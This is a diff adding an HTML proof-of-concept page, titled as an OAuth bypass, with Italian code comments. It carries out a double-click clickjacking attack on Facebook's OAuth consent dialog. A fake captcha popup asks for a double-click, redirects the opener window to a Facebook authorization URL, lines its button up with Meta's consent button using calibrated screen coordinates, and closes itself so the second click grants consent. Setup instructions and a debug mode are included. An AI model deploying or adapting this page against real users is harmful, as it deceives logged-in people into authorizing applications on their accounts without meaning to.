@@ -1,0 +1,140 @@
+<html>
+<head>
+<meta charset="UTF-8">
+<title>OAuth bypass PoC - adaptive</title>
+</head>
+<body>
+<script>
+/* Costanti del dialog Meta, fittate sulle misure:
+   {iw:811,  x:67,  y:372, w:664, h:27}
+   {iw:1366, x:346, y:369, w:662, h:31}
+   Se il layout cambia o cambi browser/locale: ricalibra qui. */
+const FIT = {
+  BX: 279 / 555,                // pendenza di x rispetto a innerWidth (bottone centrato)
+  AX: 346 - (279 / 555) * 1366, // intercetta (≈ -340.7)
+  Y: 370,                       // y del bottone nella viewport — PROVVISORIO: da confermare a diversa altezza finestra
+  W: 663,
+  H: 31,
+};
+
+const DEBUG = new URLSearchParams(location.search).has('debug');
+
+function fbBtnCenterViewport(iw) {
+  return { cx: FIT.BX * iw + FIT.AX + FIT.W / 2, cy: FIT.Y + FIT.H / 2 };
+}
+
+function openDoubleWindow() {
+  const facebookAppId = '3887027834909379';
+  const redirectUri = 'http://localhost:8000/callback';
+  const scope = 'email';
+  const facebookLoginUrl = `https://www.facebook.com/v17.0/dialog/oauth?client_id=${facebookAppId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${encodeURIComponent(scope)}`;
+
+  // Bottone FB in coordinate SCHERMO (questa finestra non cambia dimensioni navigando).
+  const c = fbBtnCenterViewport(window.innerWidth);
+  const topChrome = window.outerHeight - window.innerHeight; // toolbar; assumo nessuna scrollbar orizzontale
+  const btnScreenX = window.screenX + c.cx;                  // niente chrome a sinistra
+  const btnScreenY = window.screenY + topChrome + c.cy;
+
+  // Esca grande come l'outline del bottone FB, ritirata di 8px in larghezza e 2 in altezza:
+  // anche un click sul bordo cade dentro il bottone FB (margine di tolleranza sulla misura).
+  const escaW = FIT.W - 8, escaH = FIT.H - 2;
+
+  const winWidth = window.screen.width;
+  const winHeight = window.screen.height;
+  const demoUrl = new URL("demo.html", window.location.href).href; // stessa directory della pagina
+  var evilWindow = window.open(demoUrl,
+        "_blank",
+        `width=${winWidth},height=${winHeight},top=0,left=0`);
+
+  evilWindow.onload = function () {
+    evilWindow.document.open();
+    evilWindow.document.write(`<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Captcha Verification</title>
+<style>
+  body { font-family: Arial, sans-serif; background: #f4f6f9; display: flex; justify-content: center; align-items: flex-start; height: 100vh; margin: 0; overflow: hidden; }
+  .captcha-container { background: white; box-shadow: 0 4px 15px rgba(0,0,0,.1); border-radius: 12px; text-align: center; padding: 30px; width: 380px; margin-top: 12vh; }
+  .captcha-title { font-size: 26px; font-weight: bold; color: #333; margin-bottom: 10px; }
+  .captcha-instructions { margin: 10px 0 20px; font-size: 15px; color: #666; }
+  #timerText { font-size: 18px; font-weight: bold; }
+</style>
+</head>
+<body>
+  <div class="captcha-container">
+    <div class="captcha-title">Captcha <span>Verification</span></div>
+    <div class="captcha-instructions">Please <span>Double Click</span> the button below to verify you're human.</div>
+    <span id="timerText">5</span>
+  </div>
+
+  <div id="fb-outline" style="position:absolute; width:${FIT.W}px; height:${FIT.H}px; border:2px dashed red; opacity:.6; display:none; pointer-events:none;"></div>
+
+  <div id="doubleclick" type="button"
+    style="position:absolute; font-size:16px; color:white; background-color:#3498db; box-shadow:5px 5px 10px rgba(0,0,0,.3); display:flex; justify-content:center; align-items:center; font-weight:bold; text-shadow:1px 1px 2px rgba(0,0,0,.3); cursor:pointer; border-radius:20px; text-align:center; transition:all .3s ease;"
+    onmouseover="this.style.backgroundColor='#2980b9';" onmouseout="this.style.backgroundColor='#3498db';">OK</div>
+
+<script>
+  var TARGET = { x: ${btnScreenX}, y: ${btnScreenY} };
+  var ESCA = { w: ${escaW}, h: ${escaH} };
+  var DEBUG = ${DEBUG};
+
+  // Centra esca e outline sul bottone FB: compensa posizione reale e chrome del popup da solo.
+  (function align() {
+    var chromeTop = window.outerHeight - window.innerHeight;
+    var esca = document.getElementById('doubleclick');
+    esca.style.width = ESCA.w + 'px';
+    esca.style.height = ESCA.h + 'px';
+    esca.style.left = (TARGET.x - window.screenX - ESCA.w / 2) + 'px';
+    esca.style.top  = (TARGET.y - (window.screenY + chromeTop) - ESCA.h / 2) + 'px';
+    var o = document.getElementById('fb-outline');
+    o.style.left = (TARGET.x - window.screenX - ${FIT.W} / 2) + 'px';
+    o.style.top  = (TARGET.y - (window.screenY + chromeTop) - ${FIT.H} / 2) + 'px';
+    if (DEBUG) {
+      o.style.display = 'block';
+      document.body.style.background = 'rgba(244,246,249,0.55)';
+      console.log('TARGET schermo:', JSON.stringify(TARGET));
+      console.log('popup screenX/Y:', window.screenX, window.screenY, 'chromeTop:', chromeTop);
+      console.log('esca rect:', JSON.stringify(esca.getBoundingClientRect()));
+    }
+  })();
+
+  setTimeout(function () {
+    if (opener) { opener.location = "${facebookLoginUrl}"; }
+  }, 1000);
+
+  let timerSeconds = 5;
+  const timerText = document.getElementById("timerText");
+  const countdown = setInterval(() => {
+    if (timerSeconds <= 0) {
+      clearInterval(countdown);
+      timerText.textContent = 'Time up, DOUBLE CLICK THE BLUE BUTTON!';
+      if (!DEBUG) {
+        document.getElementById('doubleclick').addEventListener('mousedown', function () { window.close(); });
+      }
+      console.log("Timer finished.");
+    } else {
+      timerSeconds--;
+      timerText.textContent = timerSeconds;
+    }
+  }, 1000);
+<\/script>
+</body>
+</html>`);
+    evilWindow.document.close();
+  };
+}
+</script>
+
+Click the button to start the proof-of-concept. To ensure the proof-of-concept works:
+<ul>
+  <li>You need a dummy file named <b>demo.html</b> in the same directory.</li>
+  <li>You should be logged into a Facebook account in this browser session.</li>
+  <li>You should allow popups from this page.</li>
+  <li>Zoom at 100% (Ctrl+0). The browser window can be any size &mdash; the geometry adapts.</li>
+  <li>First run: open <b>index.html?debug=1</b> to verify the red outline sits exactly on the blue Meta button. Do not click.</li>
+</ul>
+
+<button onclick="openDoubleWindow()">Start Demo</button>
+</body>
+</html>
